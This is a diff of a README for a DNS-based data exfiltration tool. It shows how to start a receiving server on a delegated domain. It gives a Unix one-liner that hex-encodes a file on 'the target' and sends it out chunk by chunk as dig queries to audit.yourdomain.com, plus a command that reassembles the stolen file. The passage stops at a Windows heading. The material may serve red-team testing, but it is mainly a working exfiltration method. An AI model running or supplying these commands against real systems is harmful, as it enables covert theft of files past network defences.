@@ -6,22 +6,28 @@ audit.yourdomain.com NS ns1.yourdomain.com
 ```
 - After doing this, your should run the script as below:
 ```bash
-$ python3 exfil_server-dns.py --dns-host audit.yourdomain.com
+python3 exfil_server-dns.py --dns-host audit.yourdomain.com
 ```
 
 # Instructions
 - Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
 - Run the command using Python3 and root<br>
 ```bash
-$ python3 exfil_server-dns.py --dns-host test.yourdomain.com
+python3 exfil_server-dns.py --dns-host test.yourdomain.com
 ```
 - Now on the target, there are some ways to exfiltrate, based on operation system:<br>
+
+# Deconding the file
+- Unix
+```bash
+cat <CAPTURE_ID> | xxd -p -r >> FILE_EXFILTRADED
+```
 
 # Dumping files
 ## Unix
 - Single File
 ```bash
-$ xxd -p -c 62 <FILENAME> | sed -E 's/^(.{63})/\1./' | while read c; do dig +short +retry=0 +time=1 "$(echo "$c").abc.audit.yourdomain.com" > /dev/null; done
+xxd -p -c 62 <FILENAME> | sed -E 's/^(.{63})/\1./' | while read c; do dig +short +retry=0 +time=1 "$(echo "$c").abc.audit.yourdomain.com" > /dev/null; done
 ```
 
 ## Windows
